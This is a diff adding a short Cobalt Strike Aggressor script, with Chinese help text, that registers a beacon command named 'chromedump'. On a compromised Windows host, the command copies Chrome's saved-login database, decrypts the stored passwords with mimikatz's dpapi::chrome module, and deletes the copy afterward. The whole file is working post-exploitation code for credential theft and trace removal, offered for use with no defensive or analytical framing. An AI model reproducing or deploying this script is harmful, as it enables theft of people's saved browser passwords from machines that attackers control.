@@ -1,0 +1,17 @@
+# browser's password dump alias
+
+# register help for our alias
+beacon_command_register("chromedump", "导出chrome存储的密码，这个方法只能在桌面用户",
+	"命令: chromedump\n\n" .
+	"这个方法只能在桌面用户,使用的是mimikatz");
+
+# Chrome dump per #armitage IRC:
+#   -`butane
+alias chromedump {
+	blog($1, "[*] 备份chrome密码存储数据库");
+	bshell($1, "copy \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\"");
+	blog($1, "[*] 使用mimikatz导出密码列表");
+	bmimikatz($1, "dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\" /unprotect");
+	blog($1, "[*] 删除备份数据库文件");
+	bshell($1, "del \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\"");
+}
